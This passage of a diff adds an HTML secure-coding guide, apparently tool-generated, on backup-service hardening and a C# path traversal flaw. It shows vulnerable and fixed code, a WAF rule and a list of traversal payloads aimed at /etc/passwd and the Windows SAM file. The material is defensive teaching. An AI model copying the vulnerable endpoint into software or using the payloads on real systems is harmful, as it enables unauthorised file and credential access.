+        f'tar -czf /backups/{filename}.tar.gz /data',
+        volumes={
+            '/data': {'bind': '/data', 'mode': 'ro'},
+            '/backups': {'bind': '/backups', 'mode': 'rw'}
+        },
+        remove=True,
+        network_disabled=True,
+        mem_limit='512m',
+        cpu_quota=50000
+    )
+
+    return True</code></pre>
+                    </div>
+                    <p><strong>Benefits:</strong> Strong isolation, resource limits, network restrictions, immutable execution environment.</p>
+                </div>
+            </div>
+
+            <div class="config-section">
+                <h3>Security Control Configuration</h3>
+                <p>Implement these additional security controls at the system and application level:</p>
+
+                <div class="best-practice">
+                    <strong>Application User Permissions</strong>
+                    Run the application with a dedicated service account with minimal permissions.
+                </div>
+
+                <div class="config-example">
+                    <pre><code class="language-bash"># Create dedicated backup user
+sudo useradd -r -s /bin/false backup_service
+
+# Grant minimal permissions
+sudo chown backup_service:backup_service /backups
+sudo chmod 750 /backups
+
+# Grant read-only access to data directory
+sudo setfacl -m u:backup_service:rx /data
+sudo setfacl -R -m u:backup_service:r-x /data</code></pre>
+                </div>
+
+                <div class="best-practice">
+                    <strong>Rate Limiting and Request Validation</strong>
+                    Implement rate limiting to prevent abuse and resource exhaustion.
+                </div>
+
+                <div class="config-example">
+                    <pre><code class="language-python">from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+
+limiter = Limiter(
+    app,
+    key_func=get_remote_address,
+    default_limits=["200 per day", "50 per hour"]
+)
+
+@app.route('/backup', methods=['POST'])
+@limiter.limit("5 per hour")  # Strict limit for backup operations
+def create_backup():
+    # ... implementation</code></pre>
+                </div>
+
+                <div class="best-practice">
+                    <strong>Logging and Monitoring</strong>
+                    Log all backup operations and monitor for suspicious patterns.
+                </div>
+
+                <div class="config-example">
+                    <pre><code class="language-python">import logging
+from datetime import datetime
+
+def create_backup_with_logging(filename):
+    # Log attempt
+    app.logger.info(f'Backup request: filename={filename}, ip={request.remote_addr}')
+
+    try:
+        # Create backup (secure implementation)
+        result = create_backup_safe(filename)
+
+        # Log success
+        app.logger.info(f'Backup success: {filename}')
+
+        # Optionally notify security team of successful backups
+        notify_security_event('backup_created', filename)
+
+        return result
+    except Exception as e:
+        # Log failure with details
+        app.logger.error(f'Backup failed: {filename}, error={str(e)}')
+
+        # Notify on repeated failures (potential attack)
+        increment_failure_counter(request.remote_addr)
+
+        raise</code></pre>
+                </div>
+
+                <div class="best-practice">
+                    <strong>AppArmor/SELinux Profile</strong>
+                    Use mandatory access control to restrict what the application can execute.
+                </div>
+
+                <div class="config-example">
+                    <pre><code class="language-text"># AppArmor profile for backup service
+/usr/local/bin/backup_app {
+  # Allow Python interpreter
+  /usr/bin/python3 ix,
+
+  # Allow tar binary only
+  /usr/bin/tar Px,
+
+  # Allow reading from data directory
+  /data/** r,
+
+  # Allow writing to backup directory
+  /backups/** w,
+
+  # Deny everything else
+  deny /** wx,
+}</code></pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Path Traversal Vulnerability -->
+        <div class="vulnerability-card">
+            <div class="vuln-header">
+                <div class="vuln-title">
+                    <h2>Path Traversal Vulnerability</h2>
+                    <span class="vuln-id">3VQ2-N6XF-GS7K-MCKF</span>
+                </div>
+                <div class="severity-badge severity-high">High</div>
+            </div>
+
+            <div class="security-violation">
+                <h3>Security Principle Violated: Path Canonicalization and Access Control</h3>
+                <p>This vulnerability violates the principle of secure file system access by failing to properly validate and sanitize file paths. Attackers can use path traversal sequences (like <span class="inline-code">../</span>) to access files outside the intended directory, potentially reading sensitive system files, configuration files containing credentials, or other users' private data.</p>
+            </div>
+
+            <div class="code-comparison">
+                <div class="comparison-tabs">
+                    <button class="tab-button before-tab active" onclick="switchTab(event, 'path-before')">Vulnerable Code</button>
+                    <button class="tab-button after-tab" onclick="switchTab(event, 'path-after')">Secure Code</button>
+                </div>
+
+                <div id="path-before" class="code-panel active">
+                    <div class="code-header">
+                        <span class="code-filename">Program.cs</span>
+                        <span class="code-status status-vulnerable">VULNERABLE</span>
+                    </div>
+                    <div class="code-block">
+                        <pre><code class="language-csharp">[HttpGet("download")]
+public IActionResult DownloadReport([FromQuery] string filename)
+{
+    // VULNERABLE: No validation on user-supplied filename
+    var reportsPath = Path.Combine(_hostingEnvironment.ContentRootPath, "reports");
+    var filePath = Path.Combine(reportsPath, filename);
+
+    // Check if file exists
+    if (!System.IO.File.Exists(filePath))
+    {
+        return NotFound(new { error = "File not found" });
+    }
+
+    try
+    {
+        // Read and return file without path validation
+        var fileBytes = System.IO.File.ReadAllBytes(filePath);
+        var contentType = "application/octet-stream";
+
+        return File(fileBytes, contentType, filename);
+    }
+    catch (Exception ex)
+    {
+        return StatusCode(500, new { error = ex.Message });
+    }
+}</code></pre>
+                    </div>
+                </div>
+
+                <div id="path-after" class="code-panel">
+                    <div class="code-header">
+                        <span class="code-filename">Program.cs</span>
+                        <span class="code-status status-secure">SECURE</span>
+                    </div>
+                    <div class="code-block">
+                        <pre><code class="language-csharp">using System.Text.RegularExpressions;
+
+[HttpGet("download")]
+public IActionResult DownloadReport([FromQuery] string filename)
+{
+    // SECURE: Comprehensive input validation and path canonicalization
+
+    // Step 1: Reject null or empty filenames
+    if (string.IsNullOrWhiteSpace(filename))
+    {
+        _logger.LogWarning("Download attempt with empty filename from {IP}",
+            HttpContext.Connection.RemoteIpAddress);
+        return BadRequest(new { error = "Filename is required" });
+    }
+
+    // Step 2: Whitelist validation - only allow safe characters
+    var safeFilenamePattern = @"^[a-zA-Z0-9_\-\.]+$";
+    if (!Regex.IsMatch(filename, safeFilenamePattern))
+    {
+        _logger.LogWarning("Download attempt with invalid filename: {Filename} from {IP}",
+            filename, HttpContext.Connection.RemoteIpAddress);
+        return BadRequest(new { error = "Invalid filename format" });
+    }
+
+    // Step 3: Reject any path traversal attempts
+    if (filename.Contains("..") || filename.Contains("/") || filename.Contains("\\"))
+    {
+        _logger.LogWarning("Path traversal attempt detected: {Filename} from {IP}",
+            filename, HttpContext.Connection.RemoteIpAddress);
+        return BadRequest(new { error = "Invalid filename" });
+    }
+
+    // Step 4: Length validation
+    if (filename.Length > 255)
+    {
+        return BadRequest(new { error = "Filename too long" });
+    }
+
+    // Step 5: Build and canonicalize paths
+    var reportsPath = Path.Combine(_hostingEnvironment.ContentRootPath, "reports");
+    var requestedFilePath = Path.Combine(reportsPath, filename);
+
+    // Step 6: Canonicalize both paths (resolve symlinks, relative paths, etc.)
+    string canonicalBasePath;
+    string canonicalRequestedPath;
+
+    try
+    {
+        canonicalBasePath = Path.GetFullPath(reportsPath);
+        canonicalRequestedPath = Path.GetFullPath(requestedFilePath);
+    }
+    catch (Exception ex)
+    {
+        _logger.LogError(ex, "Path canonicalization failed for {Filename}", filename);
+        return BadRequest(new { error = "Invalid file path" });
+    }
+
+    // Step 7: Ensure requested path is within allowed directory
+    if (!canonicalRequestedPath.StartsWith(canonicalBasePath + Path.DirectorySeparatorChar) &&
+        !canonicalRequestedPath.Equals(canonicalBasePath))
+    {
+        _logger.LogWarning("Directory traversal blocked: {RequestedPath} not in {BasePath} from {IP}",
+            canonicalRequestedPath, canonicalBasePath, HttpContext.Connection.RemoteIpAddress);
+        return BadRequest(new { error = "Access denied" });
+    }
+
+    // Step 8: Verify file exists
+    if (!System.IO.File.Exists(canonicalRequestedPath))
+    {
+        return NotFound(new { error = "File not found" });
+    }
+
+    // Step 9: Optional - Verify file extension whitelist
+    var allowedExtensions = new[] { ".pdf", ".xlsx", ".csv", ".txt" };
+    var fileExtension = Path.GetExtension(canonicalRequestedPath).ToLowerInvariant();
+
+    if (!allowedExtensions.Contains(fileExtension))
+    {
+        _logger.LogWarning("Disallowed file extension requested: {Extension} for {Filename}",
+            fileExtension, filename);
+        return BadRequest(new { error = "File type not allowed" });
+    }
+
+    try
+    {
+        // Step 10: Read file with size limit check
+        var fileInfo = new FileInfo(canonicalRequestedPath);
+        const long maxFileSize = 100 * 1024 * 1024; // 100 MB limit
+
+        if (fileInfo.Length > maxFileSize)
+        {
+            _logger.LogWarning("Large file download attempt: {Size} bytes for {Filename}",
+                fileInfo.Length, filename);
+            return BadRequest(new { error = "File too large" });
+        }
+
+        // Read and return file securely
+        var fileBytes = System.IO.File.ReadAllBytes(canonicalRequestedPath);
+
+        // Set proper content type based on extension
+        var contentType = fileExtension switch
+        {
+            ".pdf" => "application/pdf",
+            ".xlsx" => "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
+            ".csv" => "text/csv",
+            ".txt" => "text/plain",
+            _ => "application/octet-stream"
+        };
+
+        // Log successful download
+        _logger.LogInformation("File downloaded: {Filename} by {IP}",
+            filename, HttpContext.Connection.RemoteIpAddress);
+
+        // Return file with proper security headers
+        Response.Headers.Add("X-Content-Type-Options", "nosniff");
+        Response.Headers.Add("Content-Security-Policy", "default-src 'none'");
+
+        return File(fileBytes, contentType, Path.GetFileName(canonicalRequestedPath));
+    }
+    catch (UnauthorizedAccessException)
+    {
+        _logger.LogError("Unauthorized file access attempt: {Path}", canonicalRequestedPath);
+        return StatusCode(403, new { error = "Access denied" });
+    }
+    catch (Exception ex)
+    {
+        _logger.LogError(ex, "Error downloading file: {Filename}", filename);
+        return StatusCode(500, new { error = "An error occurred while processing your request" });
+    }
+}</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="fix-explanation">
+                <h3>Why This Fix Works</h3>
+                <p>The secure implementation employs defense-in-depth with multiple validation layers:</p>
+                <ul>
+                    <li><strong>Whitelist Validation:</strong> Only allows alphanumeric characters, dashes, underscores, and dots, blocking all path traversal sequences.</li>
+                    <li><strong>Explicit Traversal Blocking:</strong> Specifically checks for <span class="inline-code">..</span>, <span class="inline-code">/</span>, and <span class="inline-code">\</span> characters that could enable directory traversal.</li>
+                    <li><strong>Path Canonicalization:</strong> <span class="inline-code">Path.GetFullPath()</span> resolves all relative paths, symlinks, and shortcuts to absolute canonical paths.</li>
+                    <li><strong>Prefix Validation:</strong> Verifies the canonical requested path starts with the canonical base directory, preventing escapes via symlinks or other tricks.</li>
+                    <li><strong>Extension Whitelist:</strong> Only allows specific file types, preventing access to system files or executables.</li>
+                    <li><strong>Size Limits:</strong> Prevents denial-of-service attacks via excessive file sizes.</li>
+                    <li><strong>Security Logging:</strong> All suspicious attempts are logged with IP addresses for security monitoring and incident response.</li>
+                </ul>
+            </div>
+
+            <div class="warning-box">
+                <h4>Common Attack Patterns</h4>
+                <p>Attackers could exploit the vulnerable code using various techniques:</p>
+                <p><strong>Simple traversal:</strong> <span class="inline-code">filename=../../../../etc/passwd</span> (access system password file)</p>
+                <p><strong>URL encoding:</strong> <span class="inline-code">filename=..%2F..%2F..%2Fetc%2Fpasswd</span> (bypass basic filters)</p>
+                <p><strong>Double encoding:</strong> <span class="inline-code">filename=..%252F..%252F..%252Fetc%252Fpasswd</span> (bypass multiple decode layers)</p>
+                <p><strong>Mixed separators:</strong> <span class="inline-code">filename=..\../..\../etc/passwd</span> (Windows/Linux mixed)</p>
+                <p><strong>Absolute paths:</strong> <span class="inline-code">filename=/etc/passwd</span> or <span class="inline-code">filename=C:\Windows\System32\config\SAM</span></p>
+            </div>
+
+            <div class="owasp-section">
+                <h3>OWASP Best Practices</h3>
+                <p>This remediation implements <strong>OWASP Top 10 - A01:2021 Broken Access Control</strong> prevention strategies:</p>
+                <ul>
+                    <li><strong>Input Validation:</strong> Use strict whitelist validation accepting only known-safe characters for filenames.</li>
+                    <li><strong>Path Canonicalization:</strong> Always canonicalize paths before security checks to prevent bypasses via symlinks or relative paths.</li>
+                    <li><strong>Jail/Chroot Pattern:</strong> Ensure all file operations occur within a restricted directory tree.</li>
+                    <li><strong>Defense in Depth:</strong> Layer multiple checks (whitelist, traversal detection, canonicalization, prefix validation).</li>
+                    <li><strong>Principle of Least Privilege:</strong> Application should run with minimal file system permissions.</li>
+                    <li><strong>Security Logging:</strong> Log and monitor all file access attempts, especially failures and suspicious patterns.</li>
+                    <li><strong>Content Type Headers:</strong> Use proper Content-Type and security headers to prevent content sniffing attacks.</li>
+                </ul>
+            </div>
+
+            <div class="alternatives-section">
+                <h3>Alternative Remediation Approaches</h3>
+
+                <div class="alternative-option">
+                    <h4>1. Indirect Object Reference Mapping</h4>
+                    <p>Use opaque identifiers instead of filenames, mapping them server-side to actual file paths:</p>
+                    <div class="config-example">
+                        <pre><code class="language-csharp">// Store mappings in database or secure cache
+private static readonly Dictionary&lt;string, string&gt; FileIdMapping = new()
+{
+    { "report-001", "financial_report_2024.pdf" },
+    { "report-002", "quarterly_summary.xlsx" },
+    { "report-003", "annual_statistics.csv" }
+};
+
+[HttpGet("download/{fileId}")]
+public IActionResult DownloadReportById([FromRoute] string fileId)
+{
+    // Validate file ID exists in whitelist
+    if (!FileIdMapping.TryGetValue(fileId, out var actualFilename))
+    {
+        return NotFound(new { error = "Report not found" });
+    }
+
+    // Additional authorization check
+    if (!User.HasPermissionForReport(fileId))
+    {
+        return Forbid();
+    }
+
+    // Build path using mapped filename (already validated)
+    var reportsPath = Path.Combine(_hostingEnvironment.ContentRootPath, "reports");
+    var filePath = Path.Combine(reportsPath, actualFilename);
+
+    // Proceed with file serving...
+}</code></pre>
+                    </div>
+                    <p><strong>Benefits:</strong> Users never see actual filenames, eliminates filename-based attacks, enables fine-grained access control, audit trail via ID.</p>
+                </div>
+
+                <div class="alternative-option">
+                    <h4>2. Static File Serving with Web Server</h4>
+                    <p>Leverage web server (nginx, IIS) static file serving with restricted directory configuration:</p>
+                    <div class="config-example">
+                        <pre><code class="language-nginx"># nginx configuration
+location /reports/ {
+    alias /var/www/app/reports/;
+
+    # Enable directory traversal protection
+    disable_symlinks on;
+
+    # Only allow specific file types
+    location ~ \.(pdf|xlsx|csv)$ {
+        add_header X-Content-Type-Options nosniff;
+        add_header Content-Security-Policy "default-src 'none'";
+    }
+
+    # Block access to all other files
+    location ~ {
+        return 403;
+    }
+
+    # Disable directory listing
+    autoindex off;
+}</code></pre>
+                    </div>
+                    <p><strong>Benefits:</strong> Battle-tested web server security, better performance, separation of concerns, reduced application attack surface.</p>
+                </div>
+
+                <div class="alternative-option">
+                    <h4>3. Database BLOB Storage</h4>
+                    <p>Store files as BLOBs in database with metadata-based access control:</p>
+                    <div class="config-example">
+                        <pre><code class="language-csharp">[HttpGet("download/{reportId:int}")]
+public async Task&lt;IActionResult&gt; DownloadReportFromDb([FromRoute] int reportId)
+{
+    // Query database for report metadata and content
+    var report = await _dbContext.Reports
+        .Where(r => r.Id == reportId)
+        .Where(r => r.IsActive)
+        .FirstOrDefaultAsync();
+
+    if (report == null)
+    {
+        return NotFound();
+    }
+
+    // Check authorization
+    if (!await _authService.CanAccessReport(User, reportId))
+    {
+        _logger.LogWarning("Unauthorized access attempt to report {ReportId} by user {UserId}",
+            reportId, User.Identity.Name);
+        return Forbid();
+    }
+
+    // Log access
+    await _auditLog.RecordReportAccess(reportId, User.Identity.Name);
+
+    // Return file from database BLOB
+    return File(report.FileContent, report.ContentType, report.FileName);
+}</code></pre>
+                    </div>
+                    <p><strong>Benefits:</strong> No file system access, integrated with database security, automatic backups, easier to implement row-level security.</p>
+                </div>
+
+                <div class="alternative-option">
+                    <h4>4. Cloud Storage with Signed URLs</h4>
+                    <p>Use cloud storage (S3, Azure Blob) with pre-signed temporary URLs:</p>
+                    <div class="config-example">
+                        <pre><code class="language-csharp">using Azure.Storage.Blobs;
+using Azure.Storage.Sas;
+
+[HttpGet("download/{reportId}")]
+public async Task&lt;IActionResult&gt; GetDownloadUrl([FromRoute] string reportId)
+{
+    // Validate reportId and check permissions
+    if (!await _authService.CanAccessReport(User, reportId))
+    {
+        return Forbid();
+    }
+
+    // Get blob client
+    var blobClient = _blobContainerClient.GetBlobClient($"reports/{reportId}.pdf");
+
+    // Check if blob exists
+    if (!await blobClient.ExistsAsync())
+    {
+        return NotFound();
+    }
+
+    // Generate SAS token with short expiration
+    var sasBuilder = new BlobSasBuilder
+    {
+        BlobContainerName = "reports",
+        BlobName = $"reports/{reportId}.pdf",
+        Resource = "b",
+        ExpiresOn = DateTimeOffset.UtcNow.AddMinutes(5), // Short-lived
+        Protocol = SasProtocol.Https
+    };
+
+    sasBuilder.SetPermissions(BlobSasPermissions.Read);
+
+    // Generate signed URL
+    var sasUri = blobClient.GenerateSasUri(sasBuilder);
+
+    // Log access
+    _logger.LogInformation("Generated download URL for report {ReportId} for user {User}",
+        reportId, User.Identity.Name);
+
+    // Return temporary URL to client
+    return Ok(new { downloadUrl = sasUri.ToString() });
+}</code></pre>
+                    </div>
+                    <p><strong>Benefits:</strong> Scalable, temporary access, offloads bandwidth, built-in security features, automatic CDN integration.</p>
+                </div>
+            </div>
+
+            <div class="config-section">
+                <h3>Security Control Configuration</h3>
+                <p>Implement these system-level and application configuration controls:</p>
+
+                <div class="best-practice">
+                    <strong>File System Permissions</strong>
+                    Configure restrictive file system permissions for the reports directory.
+                </div>
+
+                <div class="config-example">
+                    <pre><code class="language-bash"># Linux/macOS permissions
+sudo chown www-data:www-data /var/www/app/reports
+sudo chmod 750 /var/www/app/reports
+
+# Only application user can read files
+sudo find /var/www/app/reports -type f -exec chmod 640 {} \;
+
+# Prevent modification by application
+sudo chattr +i /var/www/app/reports/*.pdf</code></pre>
+                </div>
+
+                <div class="best-practice">
+                    <strong>ASP.NET Core Security Configuration</strong>
+                    Configure request validation and security headers globally.
+                </div>
+
+                <div class="config-example">
+                    <pre><code class="language-csharp">// Program.cs or Startup.cs
+public void Configure(IApplicationBuilder app)
+{
+    // Add security headers middleware
+    app.UseSecurityHeaders(policies =>
+    {
+        policies.AddContentTypeOptionsNoSniff();
+        policies.AddFrameOptionsDeny();
+        policies.AddXssProtectionBlock();
+        policies.AddContentSecurityPolicy(builder =>
+        {
+            builder.AddDefaultSrc().None();
+        });
+    });
+
+    // Configure request size limits
+    app.UseKestrel(options =>
+    {
+        options.Limits.MaxRequestBodySize = 100 * 1024 * 1024; // 100 MB
+    });
+
+    // Add rate limiting
+    app.UseRateLimiter();
+}</code></pre>
+                </div>
+
+                <div class="best-practice">
+                    <strong>Logging and Monitoring Configuration</strong>
+                    Configure comprehensive logging for security events.
+                </div>
+
+                <div class="config-example">
+                    <pre><code class="language-json">{
+  "Serilog": {
+    "MinimumLevel": {
+      "Default": "Information",
+      "Override": {
+        "Microsoft": "Warning",
+        "System": "Warning",
+        "Microsoft.AspNetCore.Security": "Information"
+      }
+    },
+    "WriteTo": [
+      {
+        "Name": "File",
+        "Args": {
+          "path": "/var/log/app/security-.log",
+          "rollingInterval": "Day",
+          "retainedFileCountLimit": 30,
+          "outputTemplate": "{Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{Level:u3}] {SourceContext} {Message:lj}{NewLine}{Exception}"
+        }
+      },
+      {
+        "Name": "Seq",
+        "Args": {
+          "serverUrl": "http://seq:5341"
+        }
+      }
+    ],
+    "Enrich": ["FromLogContext", "WithMachineName", "WithThreadId"]
+  }
+}</code></pre>
+                </div>
+
+                <div class="best-practice">
+                    <strong>Web Application Firewall Rules</strong>
+                    Configure WAF rules to block common path traversal patterns.
+                </div>
+
+                <div class="config-example">
+                    <pre><code class="language-yaml"># AWS WAF example rule
+Rules:
+  - Name: BlockPathTraversal
+    Priority: 1
+    Statement:
+      OrStatement:
+        Statements:
+          - ByteMatchStatement:
+              SearchString: "../"
+              FieldToMatch:
+                QueryString: {}
+              TextTransformations:
+                - Priority: 0
+                  Type: URL_DECODE
+          - ByteMatchStatement:
+              SearchString: "..%2F"
+              FieldToMatch:
+                QueryString: {}
+              TextTransformations:
+                - Priority: 0
+                  Type: NONE
+          - ByteMatchStatement:
+              SearchString: "..%5C"
+              FieldToMatch:
+                QueryString: {}
+              TextTransformations:
+                - Priority: 0
+                  Type: NONE
+    Action:
+      Block: {}
+    VisibilityConfig:
+      SampledRequestsEnabled: true
+      CloudWatchMetricsEnabled: true
+      MetricName: PathTraversalBlocked</code></pre>
+                </div>
+
+                <div class="best-practice">
+                    <strong>Authorization Policy Configuration</strong>
+                    Implement role-based or policy-based authorization for file downloads.
+                </div>
+
+                <div class="config-example">
+                    <pre><code class="language-csharp">// Configure authorization policies
+services.AddAuthorization(options =>
+{
+    options.AddPolicy("CanDownloadReports", policy =>
+        policy.RequireAssertion(context =>
+        {
+            // Check if user has download permission
+            return context.User.HasClaim("permission", "reports.download") ||
+                   context.User.IsInRole("ReportViewer") ||
+                   context.User.IsInRole("Admin");
+        }));
+});
+
+// Apply policy to controller
+[Authorize(Policy = "CanDownloadReports")]
+[HttpGet("download")]
+public IActionResult DownloadReport([FromQuery] string filename)
+{
+    // ... secure implementation
+}</code></pre>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p>This SmartFix Code Remediation Guide demonstrates secure coding practices for common vulnerability patterns.</p>
+            <p>Always follow the principle of defense-in-depth by implementing multiple layers of security controls.</p>
+            <div class="footer-links">
+                <a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10</a>
+                <a href="https://cheatsheetseries.owasp.org/" target="_blank">OWASP Cheat Sheet Series</a>
+                <a href="https://www.contrastsecurity.com/" target="_blank">Contrast Security</a>
+            </div>
+            <p style="margin-top: 30px; font-size: 0.9rem;">Generated by Contrast Security SmartFix | 2024</p>
+        </footer>
+    </div>
+
+    <script>
+        // Initialize syntax highlighting
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.querySelectorAll('pre code').forEach((block) => {
+                hljs.highlightElement(block);
+            });
+        });
+
+        // Tab switching functionality
+        function switchTab(event, panelId) {
+            // Get the parent card
+            const card = event.target.closest('.vulnerability-card');
+
+            // Hide all panels in this card
+            const panels = card.querySelectorAll('.code-panel');
+            panels.forEach(panel => panel.classList.remove('active'));
+
+            // Deactivate all tabs in this card
+            const tabs = card.querySelectorAll('.tab-button');
+            tabs.forEach(tab => tab.classList.remove('active'));
+
+            // Show selected panel
+            const selectedPanel = card.querySelector('#' + panelId);
+            if (selectedPanel) {
+                selectedPanel.classList.add('active');
+            }
+
+            // Activate clicked tab
+            event.target.classList.add('active');
+        }
+
+        // Smooth scroll to sections
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
